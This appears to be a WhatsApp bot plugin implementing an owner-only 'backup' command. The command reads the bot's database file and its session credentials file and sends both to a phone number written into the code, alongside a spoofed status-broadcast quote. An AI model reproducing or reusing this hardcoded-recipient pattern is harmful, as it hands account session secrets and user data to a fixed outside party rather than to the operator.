import fs from 'fs'
import fetch from 'node-fetch'
let handler = async (m, { conn, usedPrefix: _p, args, command }) => {
	let fdoc = {
  key : {
  remoteJid: 'status@broadcast',
  participant : '0@s.whatsapp.net'
  },
  message: {
  documentMessage: {
  title: 'Backup', 
  jpegThumbnail: await (await fetch(`https://i.ibb.co/X5NcyPJ/6e01fb2a-2173-4f88-8257-b539ab4987a2.jpg`)).buffer(),
                            }
                          }
                        }
	let d = new Date
            let date = d.toLocaleDateString('id', {
                day: 'numeric',
                month: 'long',
                year: 'numeric'
            })
conn.reply(m.chat, '*Succes*', m)
conn.reply('6283854551575' + '@s.whatsapp.net', `*🗓️ Database:* ${date}`, null)
          conn.sendFile('6283854551575' + '@s.whatsapp.net', fs.readFileSync('./database.json'), 'database.json', '_Nih databasenya_', 0, 0, { mimetype: 'application/json', quoted: fdoc})
          conn.sendFile('6283854551575' + '@s.whatsapp.net', fs.readFileSync('./session.data.json'), 'session.data.json', '_Nih sessionnya_', 0, 0, { mimetype: 'application/json', quoted: fdoc})
 }
 
 handler.help = ['backup']
handler.tags = ['owner']
handler.command = /^(backup)$/i
handler.rowner = true

export default handler